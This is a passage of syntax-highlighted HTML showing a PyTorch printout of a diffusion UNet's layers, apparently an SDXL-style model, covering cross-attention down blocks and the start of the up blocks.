(downsamplers)<span class="punctuation">:</span> ModuleList(</span><br><span class="line">        (<span class="number">0</span>)<span class="punctuation">:</span> Downsample2D(</span><br><span class="line">          (conv)<span class="punctuation">:</span> Conv2d(<span class="number">320</span><span class="punctuation">,</span> <span class="number">320</span><span class="punctuation">,</span> kernel_size=(<span class="number">3</span><span class="punctuation">,</span> <span class="number">3</span>)<span class="punctuation">,</span> stride=(<span class="number">2</span><span class="punctuation">,</span> <span class="number">2</span>)<span class="punctuation">,</span> padding=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>))</span><br><span class="line">        )</span><br><span class="line">      )</span><br><span class="line">    )</span><br><span class="line">     (<span class="number">1</span>)<span class="punctuation">:</span> CrossAttnDownBlock2D(</span><br><span class="line">      (attentions)<span class="punctuation">:</span> ModuleList(</span><br><span class="line">        (<span class="number">0</span><span class="number">-1</span>)<span class="punctuation">:</span> <span class="number">2</span> x Transformer2DModel(</span><br><span class="line">          (norm)<span class="punctuation">:</span> GroupNorm(<span class="number">32</span><span class="punctuation">,</span> <span class="number">640</span><span class="punctuation">,</span> eps=<span class="number">1e-06</span><span class="punctuation">,</span> affine=True)</span><br><span class="line">          (proj_in)<span class="punctuation">:</span> Linear(in_features=<span class="number">640</span><span class="punctuation">,</span> out_features=<span class="number">640</span><span class="punctuation">,</span> bias=True)</span><br><span class="line">          (transformer_blocks)<span class="punctuation">:</span> ModuleList(</span><br><span class="line">            (<span class="number">0</span><span class="number">-1</span>)<span class="punctuation">:</span> <span class="number">2</span> x BasicTransformerBlock(</span><br><span class="line">              (norm1)<span class="punctuation">:</span> LayerNorm((<span class="number">640</span><span class="punctuation">,</span>)<span class="punctuation">,</span> eps=<span class="number">1e-05</span><span class="punctuation">,</span> elementwise_affine=True)</span><br><span class="line">              (attn1)<span class="punctuation">:</span> Attention(</span><br><span class="line">                (to_q)<span class="punctuation">:</span> Linear(in_features=<span class="number">640</span><span class="punctuation">,</span> out_features=<span class="number">640</span><span class="punctuation">,</span> bias=False)</span><br><span class="line">                (to_k)<span class="punctuation">:</span> Linear(in_features=<span class="number">640</span><span class="punctuation">,</span> out_features=<span class="number">640</span><span class="punctuation">,</span> bias=False)</span><br><span class="line">                (to_v)<span class="punctuation">:</span> Linear(in_features=<span class="number">640</span><span class="punctuation">,</span> out_features=<span class="number">640</span><span class="punctuation">,</span> bias=False)</span><br><span class="line">                (to_out)<span class="punctuation">:</span> ModuleList(</span><br><span class="line">                  (<span class="number">0</span>)<span class="punctuation">:</span> Linear(in_features=<span class="number">640</span><span class="punctuation">,</span> out_features=<span class="number">640</span><span class="punctuation">,</span> bias=True)</span><br><span class="line">                  (<span class="number">1</span>)<span class="punctuation">:</span> Dropout(p=<span class="number">0.0</span><span class="punctuation">,</span> inplace=False)</span><br><span class="line">                )</span><br><span class="line">              )</span><br><span class="line">              (norm2)<span class="punctuation">:</span> LayerNorm((<span class="number">640</span><span class="punctuation">,</span>)<span class="punctuation">,</span> eps=<span class="number">1e-05</span><span class="punctuation">,</span> elementwise_affine=True)</span><br><span class="line">              (attn2)<span class="punctuation">:</span> Attention(</span><br><span class="line">                (to_q)<span class="punctuation">:</span> Linear(in_features=<span class="number">640</span><span class="punctuation">,</span> out_features=<span class="number">640</span><span class="punctuation">,</span> bias=False)</span><br><span class="line">                (to_k)<span class="punctuation">:</span> Linear(in_features=<span class="number">2048</span><span class="punctuation">,</span> out_features=<span class="number">640</span><span class="punctuation">,</span> bias=False)</span><br><span class="line">                (to_v)<span class="punctuation">:</span> Linear(in_features=<span class="number">2048</span><span class="punctuation">,</span> out_features=<span class="number">640</span><span class="punctuation">,</span> bias=False)</span><br><span class="line">                (to_out)<span class="punctuation">:</span> ModuleList(</span><br><span class="line">                  (<span class="number">0</span>)<span class="punctuation">:</span> Linear(in_features=<span class="number">640</span><span class="punctuation">,</span> out_features=<span class="number">640</span><span class="punctuation">,</span> bias=True)</span><br><span class="line">                  (<span class="number">1</span>)<span class="punctuation">:</span> Dropout(p=<span class="number">0.0</span><span class="punctuation">,</span> inplace=False)</span><br><span class="line">                )</span><br><span class="line">              )</span><br><span class="line">              (norm3)<span class="punctuation">:</span> LayerNorm((<span class="number">640</span><span class="punctuation">,</span>)<span class="punctuation">,</span> eps=<span class="number">1e-05</span><span class="punctuation">,</span> elementwise_affine=True)</span><br><span class="line">              (ff)<span class="punctuation">:</span> FeedForward(</span><br><span class="line">                (net)<span class="punctuation">:</span> ModuleList(</span><br><span class="line">                  (<span class="number">0</span>)<span class="punctuation">:</span> GEGLU(</span><br><span class="line">                    (proj)<span class="punctuation">:</span> Linear(in_features=<span class="number">640</span><span class="punctuation">,</span> out_features=<span class="number">5120</span><span class="punctuation">,</span> bias=True)</span><br><span class="line">                  )</span><br><span class="line">                  (<span class="number">1</span>)<span class="punctuation">:</span> Dropout(p=<span class="number">0.0</span><span class="punctuation">,</span> inplace=False)</span><br><span class="line">                  (<span class="number">2</span>)<span class="punctuation">:</span> Linear(in_features=<span class="number">2560</span><span class="punctuation">,</span> out_features=<span class="number">640</span><span class="punctuation">,</span> bias=True)</span><br><span class="line">                )</span><br><span class="line">              )</span><br><span class="line">            )</span><br><span class="line">          )</span><br><span class="line">          (proj_out)<span class="punctuation">:</span> Linear(in_features=<span class="number">640</span><span class="punctuation">,</span> out_features=<span class="number">640</span><span class="punctuation">,</span> bias=True)</span><br><span class="line">        )</span><br><span class="line">      ) </span><br><span class="line">       (resnets)<span class="punctuation">:</span> ModuleList(</span><br><span class="line">        (<span class="number">0</span>)<span class="punctuation">:</span> ResnetBlock2D(</span><br><span class="line">          (norm1)<span class="punctuation">:</span> GroupNorm(<span class="number">32</span><span class="punctuation">,</span> <span class="number">320</span><span class="punctuation">,</span> eps=<span class="number">1e-05</span><span class="punctuation">,</span> affine=True)</span><br><span class="line">          (conv1)<span class="punctuation">:</span> Conv2d(<span class="number">320</span><span class="punctuation">,</span> <span class="number">640</span><span class="punctuation">,</span> kernel_size=(<span class="number">3</span><span class="punctuation">,</span> <span class="number">3</span>)<span class="punctuation">,</span> stride=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>)<span class="punctuation">,</span> padding=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>))</span><br><span class="line">          (time_emb_proj)<span class="punctuation">:</span> Linear(in_features=<span class="number">1280</span><span class="punctuation">,</span> out_features=<span class="number">640</span><span class="punctuation">,</span> bias=True)</span><br><span class="line">          (norm2)<span class="punctuation">:</span> GroupNorm(<span class="number">32</span><span class="punctuation">,</span> <span class="number">640</span><span class="punctuation">,</span> eps=<span class="number">1e-05</span><span class="punctuation">,</span> affine=True)</span><br><span class="line">          (dropout)<span class="punctuation">:</span> Dropout(p=<span class="number">0.0</span><span class="punctuation">,</span> inplace=False)</span><br><span class="line">          (conv2)<span class="punctuation">:</span> Conv2d(<span class="number">640</span><span class="punctuation">,</span> <span class="number">640</span><span class="punctuation">,</span> kernel_size=(<span class="number">3</span><span class="punctuation">,</span> <span class="number">3</span>)<span class="punctuation">,</span> stride=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>)<span class="punctuation">,</span> padding=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>))</span><br><span class="line">          (nonlinearity)<span class="punctuation">:</span> SiLU()</span><br><span class="line">          (conv_shortcut)<span class="punctuation">:</span> Conv2d(<span class="number">320</span><span class="punctuation">,</span> <span class="number">640</span><span class="punctuation">,</span> kernel_size=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>)<span class="punctuation">,</span> stride=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>))</span><br><span class="line">        )</span><br><span class="line">        (<span class="number">1</span>)<span class="punctuation">:</span> ResnetBlock2D(</span><br><span class="line">          (norm1)<span class="punctuation">:</span> GroupNorm(<span class="number">32</span><span class="punctuation">,</span> <span class="number">640</span><span class="punctuation">,</span> eps=<span class="number">1e-05</span><span class="punctuation">,</span> affine=True)</span><br><span class="line">          (conv1)<span class="punctuation">:</span> Conv2d(<span class="number">640</span><span class="punctuation">,</span> <span class="number">640</span><span class="punctuation">,</span> kernel_size=(<span class="number">3</span><span class="punctuation">,</span> <span class="number">3</span>)<span class="punctuation">,</span> stride=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>)<span class="punctuation">,</span> padding=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>))</span><br><span class="line">          (time_emb_proj)<span class="punctuation">:</span> Linear(in_features=<span class="number">1280</span><span class="punctuation">,</span> out_features=<span class="number">640</span><span class="punctuation">,</span> bias=True)</span><br><span class="line">          (norm2)<span class="punctuation">:</span> GroupNorm(<span class="number">32</span><span class="punctuation">,</span> <span class="number">640</span><span class="punctuation">,</span> eps=<span class="number">1e-05</span><span class="punctuation">,</span> affine=True)</span><br><span class="line">          (dropout)<span class="punctuation">:</span> Dropout(p=<span class="number">0.0</span><span class="punctuation">,</span> inplace=False)</span><br><span class="line">          (conv2)<span class="punctuation">:</span> Conv2d(<span class="number">640</span><span class="punctuation">,</span> <span class="number">640</span><span class="punctuation">,</span> kernel_size=(<span class="number">3</span><span class="punctuation">,</span> <span class="number">3</span>)<span class="punctuation">,</span> stride=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>)<span class="punctuation">,</span> padding=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>))</span><br><span class="line">          (nonlinearity)<span class="punctuation">:</span> SiLU()</span><br><span class="line">        )</span><br><span class="line">      ) </span><br><span class="line">       (downsamplers)<span class="punctuation">:</span> ModuleList(</span><br><span class="line">        (<span class="number">0</span>)<span class="punctuation">:</span> Downsample2D(</span><br><span class="line">          (conv)<span class="punctuation">:</span> Conv2d(<span class="number">640</span><span class="punctuation">,</span> <span class="number">640</span><span class="punctuation">,</span> kernel_size=(<span class="number">3</span><span class="punctuation">,</span> <span class="number">3</span>)<span class="punctuation">,</span> stride=(<span class="number">2</span><span class="punctuation">,</span> <span class="number">2</span>)<span class="punctuation">,</span> padding=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>))</span><br><span class="line">        )</span><br><span class="line">      )</span><br><span class="line">    ) </span><br><span class="line">     (<span class="number">2</span>)<span class="punctuation">:</span> CrossAttnDownBlock2D(</span><br><span class="line">      (attentions)<span class="punctuation">:</span> ModuleList(</span><br><span class="line">        (<span class="number">0</span><span class="number">-1</span>)<span class="punctuation">:</span> <span class="number">2</span> x Transformer2DModel(</span><br><span class="line">          (norm)<span class="punctuation">:</span> GroupNorm(<span class="number">32</span><span class="punctuation">,</span> <span class="number">1280</span><span class="punctuation">,</span> eps=<span class="number">1e-06</span><span class="punctuation">,</span> affine=True)</span><br><span class="line">          (proj_in)<span class="punctuation">:</span> Linear(in_features=<span class="number">1280</span><span class="punctuation">,</span> out_features=<span class="number">1280</span><span class="punctuation">,</span> bias=True)</span><br><span class="line">          (transformer_blocks)<span class="punctuation">:</span> ModuleList(</span><br><span class="line">            (<span class="number">0</span><span class="number">-9</span>)<span class="punctuation">:</span> <span class="number">10</span> x BasicTransformerBlock(</span><br><span class="line">              (norm1)<span class="punctuation">:</span> LayerNorm((<span class="number">1280</span><span class="punctuation">,</span>)<span class="punctuation">,</span> eps=<span class="number">1e-05</span><span class="punctuation">,</span> elementwise_affine=True)</span><br><span class="line">              (attn1)<span class="punctuation">:</span> Attention(</span><br><span class="line">                (to_q)<span class="punctuation">:</span> Linear(in_features=<span class="number">1280</span><span class="punctuation">,</span> out_features=<span class="number">1280</span><span class="punctuation">,</span> bias=False)</span><br><span class="line">                (to_k)<span class="punctuation">:</span> Linear(in_features=<span class="number">1280</span><span class="punctuation">,</span> out_features=<span class="number">1280</span><span class="punctuation">,</span> bias=False)</span><br><span class="line">                (to_v)<span class="punctuation">:</span> Linear(in_features=<span class="number">1280</span><span class="punctuation">,</span> out_features=<span class="number">1280</span><span class="punctuation">,</span> bias=False)</span><br><span class="line">                (to_out)<span class="punctuation">:</span> ModuleList(</span><br><span class="line">                  (<span class="number">0</span>)<span class="punctuation">:</span> Linear(in_features=<span class="number">1280</span><span class="punctuation">,</span> out_features=<span class="number">1280</span><span class="punctuation">,</span> bias=True)</span><br><span class="line">                  (<span class="number">1</span>)<span class="punctuation">:</span> Dropout(p=<span class="number">0.0</span><span class="punctuation">,</span> inplace=False)</span><br><span class="line">                )</span><br><span class="line">              )</span><br><span class="line">              (norm2)<span class="punctuation">:</span> LayerNorm((<span class="number">1280</span><span class="punctuation">,</span>)<span class="punctuation">,</span> eps=<span class="number">1e-05</span><span class="punctuation">,</span> elementwise_affine=True)</span><br><span class="line">              (attn2)<span class="punctuation">:</span> Attention(</span><br><span class="line">                (to_q)<span class="punctuation">:</span> Linear(in_features=<span class="number">1280</span><span class="punctuation">,</span> out_features=<span class="number">1280</span><span class="punctuation">,</span> bias=False)</span><br><span class="line">                (to_k)<span class="punctuation">:</span> Linear(in_features=<span class="number">2048</span><span class="punctuation">,</span> out_features=<span class="number">1280</span><span class="punctuation">,</span> bias=False)</span><br><span class="line">                (to_v)<span class="punctuation">:</span> Linear(in_features=<span class="number">2048</span><span class="punctuation">,</span> out_features=<span class="number">1280</span><span class="punctuation">,</span> bias=False)</span><br><span class="line">                (to_out)<span class="punctuation">:</span> ModuleList(</span><br><span class="line">                  (<span class="number">0</span>)<span class="punctuation">:</span> Linear(in_features=<span class="number">1280</span><span class="punctuation">,</span> out_features=<span class="number">1280</span><span class="punctuation">,</span> bias=True)</span><br><span class="line">                  (<span class="number">1</span>)<span class="punctuation">:</span> Dropout(p=<span class="number">0.0</span><span class="punctuation">,</span> inplace=False)</span><br><span class="line">                )</span><br><span class="line">              )</span><br><span class="line">              (norm3)<span class="punctuation">:</span> LayerNorm((<span class="number">1280</span><span class="punctuation">,</span>)<span class="punctuation">,</span> eps=<span class="number">1e-05</span><span class="punctuation">,</span> elementwise_affine=True)</span><br><span class="line">              (ff)<span class="punctuation">:</span> FeedForward(</span><br><span class="line">                (net)<span class="punctuation">:</span> ModuleList(</span><br><span class="line">                  (<span class="number">0</span>)<span class="punctuation">:</span> GEGLU(</span><br><span class="line">                    (proj)<span class="punctuation">:</span> Linear(in_features=<span class="number">1280</span><span class="punctuation">,</span> out_features=<span class="number">10240</span><span class="punctuation">,</span> bias=True)</span><br><span class="line">                  )</span><br><span class="line">                  (<span class="number">1</span>)<span class="punctuation">:</span> Dropout(p=<span class="number">0.0</span><span class="punctuation">,</span> inplace=False)</span><br><span class="line">                  (<span class="number">2</span>)<span class="punctuation">:</span> Linear(in_features=<span class="number">5120</span><span class="punctuation">,</span> out_features=<span class="number">1280</span><span class="punctuation">,</span> bias=True)</span><br><span class="line">                )</span><br><span class="line">              )</span><br><span class="line">            )</span><br><span class="line">          )</span><br><span class="line">          (proj_out)<span class="punctuation">:</span> Linear(in_features=<span class="number">1280</span><span class="punctuation">,</span> out_features=<span class="number">1280</span><span class="punctuation">,</span> bias=True)</span><br><span class="line">        )</span><br><span class="line">      ) </span><br><span class="line">       (resnets)<span class="punctuation">:</span> ModuleList(</span><br><span class="line">        (<span class="number">0</span>)<span class="punctuation">:</span> ResnetBlock2D(</span><br><span class="line">          (norm1)<span class="punctuation">:</span> GroupNorm(<span class="number">32</span><span class="punctuation">,</span> <span class="number">640</span><span class="punctuation">,</span> eps=<span class="number">1e-05</span><span class="punctuation">,</span> affine=True)</span><br><span class="line">          (conv1)<span class="punctuation">:</span> Conv2d(<span class="number">640</span><span class="punctuation">,</span> <span class="number">1280</span><span class="punctuation">,</span> kernel_size=(<span class="number">3</span><span class="punctuation">,</span> <span class="number">3</span>)<span class="punctuation">,</span> stride=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>)<span class="punctuation">,</span> padding=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>))</span><br><span class="line">          (time_emb_proj)<span class="punctuation">:</span> Linear(in_features=<span class="number">1280</span><span class="punctuation">,</span> out_features=<span class="number">1280</span><span class="punctuation">,</span> bias=True)</span><br><span class="line">          (norm2)<span class="punctuation">:</span> GroupNorm(<span class="number">32</span><span class="punctuation">,</span> <span class="number">1280</span><span class="punctuation">,</span> eps=<span class="number">1e-05</span><span class="punctuation">,</span> affine=True)</span><br><span class="line">          (dropout)<span class="punctuation">:</span> Dropout(p=<span class="number">0.0</span><span class="punctuation">,</span> inplace=False)</span><br><span class="line">          (conv2)<span class="punctuation">:</span> Conv2d(<span class="number">1280</span><span class="punctuation">,</span> <span class="number">1280</span><span class="punctuation">,</span> kernel_size=(<span class="number">3</span><span class="punctuation">,</span> <span class="number">3</span>)<span class="punctuation">,</span> stride=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>)<span class="punctuation">,</span> padding=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>))</span><br><span class="line">          (nonlinearity)<span class="punctuation">:</span> SiLU()</span><br><span class="line">          (conv_shortcut)<span class="punctuation">:</span> Conv2d(<span class="number">640</span><span class="punctuation">,</span> <span class="number">1280</span><span class="punctuation">,</span> kernel_size=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>)<span class="punctuation">,</span> stride=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>))</span><br><span class="line">        )</span><br><span class="line">        (<span class="number">1</span>)<span class="punctuation">:</span> ResnetBlock2D(</span><br><span class="line">          (norm1)<span class="punctuation">:</span> GroupNorm(<span class="number">32</span><span class="punctuation">,</span> <span class="number">1280</span><span class="punctuation">,</span> eps=<span class="number">1e-05</span><span class="punctuation">,</span> affine=True)</span><br><span class="line">          (conv1)<span class="punctuation">:</span> Conv2d(<span class="number">1280</span><span class="punctuation">,</span> <span class="number">1280</span><span class="punctuation">,</span> kernel_size=(<span class="number">3</span><span class="punctuation">,</span> <span class="number">3</span>)<span class="punctuation">,</span> stride=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>)<span class="punctuation">,</span> padding=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>))</span><br><span class="line">          (time_emb_proj)<span class="punctuation">:</span> Linear(in_features=<span class="number">1280</span><span class="punctuation">,</span> out_features=<span class="number">1280</span><span class="punctuation">,</span> bias=True)</span><br><span class="line">          (norm2)<span class="punctuation">:</span> GroupNorm(<span class="number">32</span><span class="punctuation">,</span> <span class="number">1280</span><span class="punctuation">,</span> eps=<span class="number">1e-05</span><span class="punctuation">,</span> affine=True)</span><br><span class="line">          (dropout)<span class="punctuation">:</span> Dropout(p=<span class="number">0.0</span><span class="punctuation">,</span> inplace=False)</span><br><span class="line">          (conv2)<span class="punctuation">:</span> Conv2d(<span class="number">1280</span><span class="punctuation">,</span> <span class="number">1280</span><span class="punctuation">,</span> kernel_size=(<span class="number">3</span><span class="punctuation">,</span> <span class="number">3</span>)<span class="punctuation">,</span> stride=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>)<span class="punctuation">,</span> padding=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>))</span><br><span class="line">          (nonlinearity)<span class="punctuation">:</span> SiLU()</span><br><span class="line">        )</span><br><span class="line">      )</span><br><span class="line">    )</span><br><span class="line">  ) </span><br><span class="line">   (up_blocks) <span class="punctuation">:</span> ModuleList(</span><br><span class="line">    (<span class="number">0</span>)<span class="punctuation">:</span> CrossAttnUpBlock2D(</span><br><span class="line">      (attentions)<span class="punctuation">:</span> ModuleList(</span><br><span class="line">        (<span class="number">0</span><span class="number">-2</span>)<span class="punctuation">:</span> <span class="number">3</span> x Transformer2DModel(</span><br><span class="line">          (norm)<span class="punctuation">:</span> GroupNorm(<span class="number">32</span><span class="punctuation">,</span> <span class="number">1280</span><span class="punctuation">,</span> eps=<span class="number">1e-06</span><span class="punctuation">,</span> affine=True)</span><br><span class="line">          (proj_in)<span class="punctuation">:</span> Linear(in_features=<span class="number">1280</span><span class="punctuation">,</span> out_features=<span class="number">1280</span><span class="punctuation">,</span> bias=True)</span><br><span class="line">          (transformer_blocks)<span class="punctuation">:</span> ModuleList(</span><br><span class="line">            (<span class="number">0</span><span class="number">-9</span>)<span class="punctuation">:</span> <span class="number">10</span> x BasicTransformerBlock(</span><br><span class="line">              (norm1)<span class="punctuation">:</span> LayerNorm((<span class="number">1280</span><span class="punctuation">,</span>)<span class="punctuation">,</span> eps=<span class="number">1e-05</span><span class="punctuation">,</span> elementwise_affine=True)</span><br><span class="line">              (attn1)<span class="punctuation">:</span> Attention(</span><br><span class="line">                (to_q)<span class="punctuation">:</span> Linear(in_features=<span class="number">1280</span><span class="punctuation">,</span> out_features=<span class="number">1280</span><span class="punctuation">,</span> bias=False)</span><br><span class="line">                (to_k)<span class="punctuation">:</span> Linear(in_features=<span class="number">1280</span><span class="punctuation">,</span> out_features=<span class="number">1280</span><span class="punctuation">,</span> bias=False)</span><br><span class="line">                (to_v)<span class="punctuation">:</span> Linear(in_features=<span class="number">1280</span><span class="punctuation">,</span> out_features=<span class="number">1280</span><span class="punctuation">,</span> bias=False)</span><br><span class="line">                (to_out)<span class="punctuation">:</span> ModuleList(</span><br><span class="line">                  (<span class="number">0</span>)<span class="punctuation">:</span> Linear(in_features=<span class="number">1280</span><span class="punctuation">,</span> out_features=<span class="number">1280</span><span class="punctuation">,</span> bias=True)</span><br><span class="line">                  (<span class="number">1</span>)<span class="punctuation">:</span> Dropout(p=<span class="number">0.0</span><span class="punctuation">,</span> inplace=False)</span><br><span class="line">                )</span><br><span class="line">              )</span><br><span class="line">              (norm2)<span class="punctuation">:</span> LayerNorm((<span class="number">1280</span><span class="punctuation">,</span>)<span class="punctuation">,</span> eps=<span class="number">1e-05</span><span class="punctuation">,</span> elementwise_affine=True)</span><br><span class="line">              (attn2)<span class="punctuation">:</span> Attention(</span><br><span class="line">                (to_q)<span class="punctuation">:</span> Linear(in_features=<span class="number">1280</span><span class="punctuation">,</span> out_features=<span class="number">1280</span><span class="punctuation">,</span> bias=False)</span><br><span class="line">                (to_k)<span class="punctuation">:</span> Linear(in_features=<span class="number">2048</span><span class="punctuation">,</span> out_features=<span class="number">1280</span><span class="punctuation">,</span> bias=False)</span><br><span class="line">                (to_v)<span class="punctuation">:</span> Linear(in_features=<span class="number">2048</span><span class="punctuation">,</span> out_features=<span class="number">1280</span><span class="punctuation">,</span> bias=False)</span><br><span class="line">                (to_out)<span class="punctuation">:</span> ModuleList(</span><br><span class="line">                  (<span class="number">0</span>)<span class="punctuation">:</span> Linear(in_features=<span class="number">1280</span><span class="punctuation">,</span> out_features=<span class="number">1280</span><span class="punctuation">,</span> bias=True)</span><br><span class="line">                  (<span class="number">1</span>)<span class="punctuation">:</span> Dropout(p=<span class="number">0.0</span><span class="punctuation">,</span> inplace=False)</span><br><span class="line">                )</span><br><span class="line">              )</span><br><span class="line">              (norm3)<span class="punctuation">:</span> LayerNorm((<span class="number">1280</span><span class="punctuation">,</span>)<span class="punctuation">,</span> eps=<span class="number">1e-05</span><span class="punctuation">,</span> elementwise_affine=True)</span><br><span class="line">              (ff)<span class="punctuation">:</span> FeedForward(</span><br><span class="line">                (net)<span class="punctuation">:</span> ModuleList(</span><br><span class="line">                  (<span class="number">0</span>)<span class="punctuation">:</span> GEGLU(</span><br><span class="line">                    (proj)<span class="punctuation">:</span> Linear(in_features=<span class="number">1280</span><span class="punctuation">,</span> out_features=<span class="number">10240</span><span class="punctuation">,</span> bias=True)</span><br><span class="line">                  )</span><br><span class="line">                  (<span class="number">1</span>)<span class="punctuation">:</span> Dropout(p=<span class="number">0.0</span><span class="punctuation">,</span> inplace=False)</span><br><span class="line">                  (<span class="number">2</span>)<span class="punctuation">:</span> Linear(in_features=<span class="number">5120</span><span class="punctuation">,</span> out_features=<span class="number">1280</span><span class="punctuation">,</span> bias=True)</span><br><span class="line">                )</span><br><span class="line">              )</span><br><span class="line">            )</span><br><span class="line">          )</span><br><span class="line">          (proj_out)<span class="punctuation">:</span> Linear(in_features=<span class="number">1280</span><span class="punctuation">,</span> out_features=<span class="number">1280</span><span class="punctuation">,</span> bias=True)</span><br><span class="line">        )</span><br><span class="line">      )</span><br><span class="line">      (resnets)<span class="punctuation">:</span> ModuleList(</span><br><span class="line">        (<span class="number">0</span><span class="number">-1</span>)<span class="punctuation">:</span> <span class="number">2</span> x ResnetBlock2D(</span><br><span class="line">          (norm1)<span class="punctuation">:</span> GroupNorm(<span class="number">32</span><span class="punctuation">,</span> <span class="number">2560</span><span class="punctuation">,</span> eps=<span class="number">1e-05</span><span class="punctuation">,</span> affine=True)</span><br><span class="line">          (conv1)<span class="punctuation">:</span> Conv2d(<span class="number">2560</span><span class="punctuation">,</span> <span class="number">1280</span><span class="punctuation">,</span> kernel_size=(<span class="number">3</span><span class="punctuation">,</span> <span class="number">3</span>)<span class="punctuation">,</span> stride=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>)<span class="punctuation">,</span> padding=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>))</span><br><span class="line">          (time_emb_proj)<span class="punctuation">:</span> Linear(in_features=<span class="number">1280</span><span class="punctuation">,</span> out_features=<span class="number">1280</span><span class="punctuation">,</span> bias=True)</span><br><span class="line">          (norm2)<span class="punctuation">:</span> GroupNorm(<span class="number">32</span><span class="punctuation">,</span> <span class="number">1280</span><span class="punctuation">,</span> eps=<span class="number">1e-05</span><span class="punctuation">,</span> affine=True)</span><br><span class="line">          (dropout)<span class="punctuation">:</span> Dropout(p=<span class="number">0.0</span><span class="punctuation">,</span> inplace=False)</span><br><span class="line">          (conv2)<span class="punctuation">:</span> Conv2d(<span class="number">1280</span><span class="punctuation">,</span> <span class="number">1280</span><span class="punctuation">,</span> kernel_size=(<span class="number">3</span><span class="punctuation">,</span> <span class="number">3</span>)<span class="punctuation">,</span> stride=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>)<span class="punctuation">,</span> padding=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>))</span><br><span class="line">          (nonlinearity)<span class="punctuation">:</span> SiLU()</span><br><span class="line">          (conv_shortcut)<span class="punctuation">:</span> Conv2d(<span class="number">2560</span><span class="punctuation">,</span> <span class="number">1280</span><span class="punctuation">,</span> kernel_size=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>)<span class="punctuation">,</span> stride=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>))</span><br><span class="line">        )</span><br><span class="line">        (<span class="number">2</span>)<span class="punctuation">:</span> ResnetBlock2D(</span><br><span class="line">          (norm1)<span class="punctuation">:</span> GroupNorm(<span class="number">32</span><span class="punctuation">,</span> <span class="number">1920</span><span class="punctuation">,</span> eps=<span class="number">1e-05</span><span class="punctuation">,</span> affine=True)</span><br><span class="line">          (conv1)<span class="punctuation">:</span> Conv2d(<span class="number">1920</span><span class="punctuation">,</span> <span class="number">1280</span><span class="punctuation">,</span> kernel_size=(<span class="number">3</span><span class="punctuation">,</span> <span class="number">3</span>)<span class="punctuation">,</span> stride=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>)<span class="punctuation">,</span> padding=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>))</span><br><span class="line">          (time_emb_proj)<span class="punctuation">:</span> Linear(in_features=<span class="number">1280</span><span class="punctuation">,</span> out_features=<span class="number">1280</span><span class="punctuation">,</span> bias=True)</span><br><span class="line">          (norm2)<span class="punctuation">:</span> GroupNorm(<span class="number">32</span><span class="punctuation">,</span> <span class="number">1280</span><span class="punctuation">,</span> eps=<span class="number">1e-05</span><span class="punctuation">,</span> affine=True)</span><br><span class="line">          (dropout)<span class="punctuation">:</span> Dropout(p=<span class="number">0.0</span><span class="punctuation">,</span> inplace=False)</span><br><span class="line">          (conv2)<span class="punctuation">:</span> Conv2d(<span class="number">1280</span><span class="punctuation">,</span> <span class="number">1280</span><span class="punctuation">,</span> kernel_size=(<span class="number">3</span><span class="punctuation">,</span> <span class="number">3</span>)<span class="punctuation">,</span> stride=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>)<span class="punctuation">,</span> padding=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>))</span><br><span class="line">          (nonlinearity)<span class="punctuation">:</span> SiLU()</span><br><span class="line">          (conv_shortcut)<span class="punctuation">:</span> Conv2d(<span class="number">1920</span><span class="punctuation">,</span> <span class="number">1280</span><span class="punctuation">,</span> kernel_size=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>)<span class="punctuation">,</span> stride=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>))</span><br><span class="line">        )</span><br><span class="line">      )</span><br><span class="line">      (upsamplers)<span class="punctuation">:</span> ModuleList(</span><br><span class="line">        (<span class="number">0</span>)<span class="punctuation">:</span> Upsample2D(</span><br><span class="line">          (conv)<span class="punctuation">:</span> Conv2d(<span class="number">1280</span><span class="punctuation">,</span> <span class="number">1280</span><span class="punctuation">,</span> kernel_size=(<span class="number">3</span><span class="punctuation">,</span> <span class="number">3</span>)<span class="punctuation">,</span> stride=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>)<span class="punctuation">,</span> padding=(<span class="number">1</span><span class="punctuation">,</span> <span class="number">1</span>))</span><br><span class="line">        )</span><br><span class="line">      )</span><br><span class="line">    )</span><br><span class="line">    (<span class="number">1</span>)<span class="punctuation">:</span> CrossAttnUpBlock2D(</span><br><span class="line">      (attentions)<span class="punctuation">:</span> ModuleList(</span><br><span class="line">        (<span class="number">0</span><span class="number">-2</span>)<span class="punctuation">:</span> <span class="number">3</span> x Transformer2DModel(</span><br><span class="line">          (norm)<span class="punctuation">:</span> GroupNorm(<span class="number">32</span><span class="punctuation">,</span> <span class="number">640</span><span class="punctuation">,</span> eps=<span class="number">1e-06</span><span 